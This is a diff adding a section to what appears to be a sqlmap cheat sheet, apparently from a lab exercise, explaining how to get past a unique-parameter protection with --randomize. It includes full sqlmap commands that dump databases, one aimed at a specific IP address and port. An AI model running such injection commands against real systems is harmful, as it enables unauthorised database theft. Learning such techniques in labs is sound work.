@@ -65,7 +65,11 @@ req.txt file
 
 #sqlmap -r req.txt --csrf-token="t0ken" --batch --dump
 
+# Unique parameter Bypass
 
+Each parameter is combined with unique parameter for protection, to bypass the unique parameter just the value called --randomize 
+
+#sqlmap -u "http://154.57.164.79:31524/case9.php?id=1&uid=26987434" --randomize=uid --batch --dump
 
 
 
